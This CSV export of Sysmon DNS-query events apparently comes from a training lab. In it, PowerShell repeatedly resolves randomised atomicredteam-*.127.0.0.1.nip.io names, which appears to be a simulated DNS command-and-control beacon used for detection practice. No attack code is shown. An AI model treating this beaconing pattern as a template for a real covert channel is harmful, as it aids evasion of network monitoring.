"2025-12-26 11:27:28.690 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174581,"Query: atomicredteam-275036.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:27.956","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:28.690 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174582,"Query: atomicredteam-1272.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:28.020","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:28.690 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174583,"Query: atomicredteam-22100.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:28.064","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:28.690 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174584,"Query: atomicredteam-491288.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:28.167","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:28.690 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174585,"Query: atomicredteam-83419.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:28.208","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:28.690 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174586,"Query: atomicredteam-580992.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:28.247","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:28.690 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174587,"Query: atomicredteam-58630.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:28.303","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:28.690 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174588,"Query: atomicredteam-244314.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:28.351","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:28.690 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174589,"Query: atomicredteam-28781.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:28.389","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:28.690 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174590,"Query: atomicredteam-152067.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:28.428","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:28.690 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174591,"Query: atomicredteam-709892.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:28.465","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:29.702 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174592,"Query: atomicredteam-11349.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:28.519","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:29.702 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174593,"Query: atomicredteam-718348.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:28.560","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:29.702 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174594,"Query: atomicredteam-776275.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:28.893","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:29.702 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174595,"Query: atomicredteam-675318.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:29.014","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:29.702 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174596,"Query: atomicredteam-468256.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:29.053","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:29.702 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174597,"Query: atomicredteam-135397.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:29.093","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:29.702 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174598,"Query: atomicredteam-97037.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:29.134","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:29.702 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174599,"Query: atomicredteam-888879.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:29.175","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:29.702 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174600,"Query: atomicredteam-237008.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:29.214","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:29.702 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174601,"Query: atomicredteam-29499.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:29.531","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:29.702 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174602,"Query: atomicredteam-690405.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:29.569","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:29.702 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174603,"Query: atomicredteam-895267.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:29.607","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:29.702 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174604,"Query: atomicredteam-313623.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:29.645","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:30.714 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174605,"Query: atomicredteam-900412.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:29.683","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:30.714 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174606,"Query: atomicredteam-474488.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:29.720","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:30.714 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174607,"Query: atomicredteam-532697.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:29.762","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:30.714 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174608,"Query: atomicredteam-287798.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:29.800","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:30.714 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174609,"Query: atomicredteam-992731.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:30.126","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:30.714 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174610,"Query: atomicredteam-529907.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:30.165","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:30.714 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174611,"Query: atomicredteam-838311.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:30.204","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:30.714 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174612,"Query: atomicredteam-150709.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:30.241","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:30.714 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174613,"Query: atomicredteam-956492.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:30.280","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:30.714 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174614,"Query: atomicredteam-640802.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:30.319","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:30.714 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174615,"Query: atomicredteam-337844.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:30.639","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:31.728 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174616,"Query: atomicredteam-395164.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:30.679","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:31.728 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174617,"Query: atomicredteam-159324.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:30.719","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:31.728 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174618,"Query: atomicredteam-487915.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:30.759","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:31.728 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174619,"Query: atomicredteam-716277.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:30.797","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:31.728 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174620,"Query: atomicredteam-470319.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:30.837","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:31.728 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174621,"Query: atomicredteam-277438.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:30.875","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:31.728 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174622,"Query: atomicredteam-74951.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:30.913","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:31.728 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174623,"Query: atomicredteam-690364.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:30.952","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:31.728 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174624,"Query: atomicredteam-182493.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:30.990","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:31.728 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174625,"Query: atomicredteam-466460.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:31.029","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:31.728 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174626,"Query: atomicredteam-923309.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:31.066","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:31.728 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174627,"Query: atomicredteam-642397.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:31.104","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:31.728 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174628,"Query: atomicredteam-709005.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:31.148","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
